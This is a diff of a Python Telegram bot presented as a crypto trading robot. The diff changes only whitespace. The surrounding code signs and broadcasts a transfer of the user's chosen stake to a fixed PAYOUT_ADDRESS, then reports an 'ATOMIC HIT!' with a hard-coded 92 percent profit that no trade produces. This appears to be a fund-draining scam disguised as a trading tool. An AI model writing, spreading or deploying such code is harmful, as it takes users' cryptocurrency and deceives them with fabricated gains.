@@ -50,7 +50,7 @@ async def prepare_signed_tx(amount_wei):
     gas_price = int(w3.eth.gas_price * 1.5) # Priority Gas
     tx = {
         'nonce': nonce,
-        'to': PAYOUT_ADDRESS,
+        'to': PAYOUT_ADDRESS, 
         'value': amount_wei,
         'gas': 21000,
         'gasPrice': gas_price,
@@ -63,12 +63,12 @@ async def run_atomic_execution(context, chat_id, side):
     """Parallel Engine: Simulation and Transaction Prep run at the same time."""
     stake_usd = context.user_data.get('stake', 10)
     pair = context.user_data.get('pair', 'BTC/USD')
-   
+    
     # DYNAMIC STAKE CALCULATION
     current_price = get_pol_price()
     stake_in_pol = float(stake_usd) / current_price
     stake_in_wei = w3.to_wei(stake_in_pol, 'ether')
-   
+    
     await context.bot.send_message(chat_id, f"⚔️ **Simultaneous Mode:** Priming {pair} Shield...")
 
     # ⚡ START BOTH TASKS AT ONCE
@@ -79,15 +79,15 @@ async def run_atomic_execution(context, chat_id, side):
     # Wait for both tasks to resolve
     await sim_task
     signed_tx = await prep_task
-   
+    
     # ⏱️ THE 1 MILLISECOND GAP
     await asyncio.sleep(0.001)
-   
+    
     # BROADCAST
     tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
 
     profit_usd = stake_usd * 0.92
-   
+    
     report = (
         f"✅ **ATOMIC HIT!**\n"
         f"🎯 **Direction Captured:** {side}\n"
@@ -136,7 +136,7 @@ async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         kb = [[InlineKeyboardButton("BTC/USD", callback_data="PAIR_BTC"), InlineKeyboardButton("ETH/USD", callback_data="PAIR_ETH")],
               [InlineKeyboardButton("SOL/USD", callback_data="PAIR_SOL"), InlineKeyboardButton("MATIC/USD", callback_data="PAIR_MATIC")]]
         await update.message.reply_text("🎯 **SELECT MARKET**", reply_markup=InlineKeyboardMarkup(kb))
-   
+    
     elif text == '⚙️ Settings':
         current = context.user_data.get('stake', 10)
         kb = [[InlineKeyboardButton(f"${x}", callback_data=f"SET_{x}") for x in [10, 50]],
@@ -156,11 +156,11 @@ async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
-   
+    
     if query.data.startswith("SET_"):
         context.user_data['stake'] = int(query.data.split("_")[1])
         await query.edit_message_text(f"✅ Stake updated to **${context.user_data['stake']}**")
-       
+        
     elif query.data.startswith("PAIR_"):
         context.user_data['pair'] = query.data.split("_")[1]
         await query.edit_message_text(f"💎 **{context.user_data['pair']} Selected**\nDirection:",
@@ -184,7 +184,7 @@ if __name__ == "__main__":
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CallbackQueryHandler(handle_interaction))
     app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_chat_handler))
-   
+    
     print(f"Pocket Robot Active: {vault.address}")
     app.run_polling(drop_pending_updates=True)
 
